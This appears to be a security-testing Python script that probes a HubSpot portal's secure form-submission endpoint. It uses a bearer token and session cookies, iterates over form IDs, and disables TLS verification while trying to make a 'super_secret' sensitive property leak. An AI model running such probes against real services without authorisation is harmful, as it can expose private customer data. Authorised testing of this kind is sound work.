#!/usr/bin/env python3
"""
Test the secure form submission endpoint
Found via error message: "Please use submissions/v3/integration/secure/submit endpoint"
"""

import requests
import json
import os
from dotenv import load_dotenv
import urllib3

urllib3.disable_warnings()
load_dotenv()

TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')

print("="*80)
print("Testing SECURE Form Submission Endpoint")
print("="*80)
print("\nFound: super_secret is a 'sensitive property'")
print("Endpoint: submissions/v3/integration/secure/submit")
print("="*80)

# Try the secure endpoint with authentication
secure_url = f'https://api.hsforms.com/submissions/v3/integration/secure/submit/{TARGET_PORTAL}/1'

headers_token = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
    'Content-Type': 'application/json',
}

headers_session = {
    'Cookie': SESSION_COOKIES,
    'Content-Type': 'application/json',
}

# Test payloads that might leak data
test_cases = [
    {
        'name': 'Submit to super_secret with token',
        'url': secure_url,
        'headers': headers_token,
        'method': 'POST',
        'data': {
            "fields": [
                {"name": "super_secret", "value": "test"}
            ]
        }
    },
    {
        'name': 'Submit to super_secret with session',
        'url': secure_url,
        'headers': headers_session,
        'method': 'POST',
        'data': {
            "fields": [
                {"name": "super_secret", "value": "test"}
            ]
        }
    },
    {
        'name': 'GET secure endpoint with token',
        'url': secure_url,
        'headers': headers_token,
        'method': 'GET',
        'data': None
    },
]

for test in test_cases:
    print(f"\n[*] Test: {test['name']}")
    print(f"    URL: {test['url'][:70]}")

    try:
        if test['method'] == 'POST':
            r = requests.post(test['url'], headers=test['headers'], json=test['data'], verify=False, timeout=10)
        else:
            r = requests.get(test['url'], headers=test['headers'], verify=False, timeout=10)

        print(f"    Status: {r.status_code}")

        if r.status_code != 404:
            try:
                data = r.json()
                print(f"    Response: {json.dumps(data, indent=2)[:500]}")

                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n    *** Contains super_secret! ***")
                    print(json.dumps(data, indent=2))

                    with open('/home/user/Hub/findings/SECURE_FORM_RESPONSE.json', 'w') as f:
                        json.dump(data, f, indent=2)
            except:
                print(f"    Response: {r.text[:300]}")

    except Exception as e:
        print(f"    Error: {str(e)[:80]}")

# Also try different form IDs
print("\n" + "="*80)
print("Testing Multiple Form IDs")
print("="*80)

form_ids = [1, 3, 4, 5, 6, 8, 13, 18]

for fid in form_ids:
    url = f'https://api.hsforms.com/submissions/v3/integration/secure/submit/{TARGET_PORTAL}/{fid}'

    payload = {
        "fields": [
            {"name": "super_secret", "value": "test"}
        ]
    }

    try:
        r = requests.post(url, headers=headers_token, json=payload, verify=False, timeout=5)

        if r.status_code != 404:
            print(f"\n[Form {fid}] Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  *** SUCCESS! Form {fid} accepted super_secret! ***")
                try:
                    print(f"  Response: {r.json()}")
                except:
                    print(f"  Response: {r.text[:200]}")
    except:
        pass

print("\n" + "="*80)
print("SECURE Form Endpoint Testing Complete")
print("="*80)
